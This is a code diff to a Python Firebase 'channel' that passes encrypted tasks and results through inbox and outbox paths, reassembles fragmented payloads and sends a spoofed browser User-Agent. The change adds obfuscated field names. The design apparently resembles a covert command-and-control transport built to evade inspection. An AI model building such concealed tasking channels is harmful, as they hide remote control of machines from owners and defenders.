@@ -1,9 +1,44 @@
+import json
 import os
+from typing import Optional
 
 import requests
 
 import common
 from channel.base import Channel
+
+
+def _get_column_map(env_key: str) -> dict:
+    """Load {logical_name: obfuscated_field_name} from env var.
+    Returns empty dict if unset — code uses logical field names as-is.
+    """
+    raw = os.environ.get(env_key, "").strip()
+    if not raw:
+        return {}
+    try:
+        return json.loads(raw)
+    except json.JSONDecodeError:
+        print(f"[warn] {env_key} is not valid JSON — falling back to logical field names")
+        return {}
+
+
+def _translate_row(row: dict, column_map: dict) -> dict:
+    """Translate obfuscated field keys → logical names using reverse of column_map.
+    Keys not present in the map pass through unchanged.
+    """
+    if not column_map:
+        return row
+    reverse = {v: k for k, v in column_map.items()}
+    return {reverse.get(k, k): v for k, v in row.items()}
+
+
+def _obfuscate_row(row: dict, column_map: dict) -> dict:
+    """Translate logical field names → obfuscated keys using column_map.
+    Keys not present in the map pass through unchanged.
+    """
+    if not column_map:
+        return row
+    return {column_map.get(k, k): v for k, v in row.items()}
 
 _UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -62,8 +97,8 @@ class FirebaseChannel(Channel):
     # Low-level REST operations
     # ------------------------------------------------------------------
 
-    def _read(self, url: str) -> list:
-        """GET a Firebase path. Returns list of decrypted row dicts."""
+    def _read(self, url: str, column_map: Optional[dict] = None) -> list:
+        """GET a Firebase path. Returns list of decrypted, de-obfuscated row dicts."""
         try:
             resp = requests.get(url, headers=_HEADERS, timeout=15)
             resp.raise_for_status()
@@ -71,21 +106,26 @@ class FirebaseChannel(Channel):
             if not data:
                 return []
             enc = common.get_encryptor()
+            col_map = column_map if column_map is not None else {}
             rows = []
             for entry in data.values():
                 if isinstance(entry, dict):
-                    rows.append(common._decrypt_row(entry, enc))
+                    row = _translate_row(entry, col_map)      # obfuscated keys → logical
+                    row = common._decrypt_row(row, enc)        # decrypt values
+                    rows.append(row)
             return rows
         except Exception as e:
             print(f"[error] Firebase read failed: {e}")
             return []
 
-    def _write(self, url: str, data: dict) -> bool:
+    def _write(self, url: str, data: dict, column_map: Optional[dict] = None) -> bool:
         """PUT a dict to a Firebase path. Returns True on success."""
         enc = common.get_encryptor()
-        encrypted = common._encrypt_row(data, enc)
+        col_map = column_map if column_map is not None else {}
+        encrypted = common._encrypt_row(data, enc)            # encrypt values first
+        obfuscated = _obfuscate_row(encrypted, col_map)       # logical keys → obfuscated
         try:
-            resp = requests.put(url, json=encrypted, headers=_HEADERS, timeout=15)
+            resp = requests.put(url, json=obfuscated, headers=_HEADERS, timeout=15)
             return resp.ok
         except Exception as e:
             print(f"[error] Firebase write failed: {e}")
@@ -105,20 +145,24 @@ class FirebaseChannel(Channel):
     # ------------------------------------------------------------------
 
     def read_inbox(self) -> list:
-        rows = self._read(self._inbox_url())
+        col_map = _get_column_map("FIREBASE_INBOX_COLUMN_MAP")
+        rows = self._read(self._inbox_url(), col_map)
         return common._reassemble_fragments(rows, "payload", "pending")
 
     def read_outbox(self) -> list:
-        rows = self._read(self._outbox_url())
+        col_map = _get_column_map("FIREBASE_OUTBOX_COLUMN_MAP")
+        rows = self._read(self._outbox_url(), col_map)
         return common._reassemble_fragments(rows, "result", "success")
 
     def write_task(self, data: dict) -> bool:
+        col_map = _get_column_map("FIREBASE_INBOX_COLUMN_MAP")
         url = self._inbox_url(f"/{_entry_key(data)}")
-        return self._write(url, data)
+        return self._write(url, data, col_map)
 
     def write_result(self, data: dict) -> bool:
+        col_map = _get_column_map("FIREBASE_OUTBOX_COLUMN_MAP")
         url = self._outbox_url(f"/{_entry_key(data)}")
-        return self._write(url, data)
+        return self._write(url, data, col_map)
 
     # ------------------------------------------------------------------
     # Cleanup — Firebase supports DELETE unlike Sheets
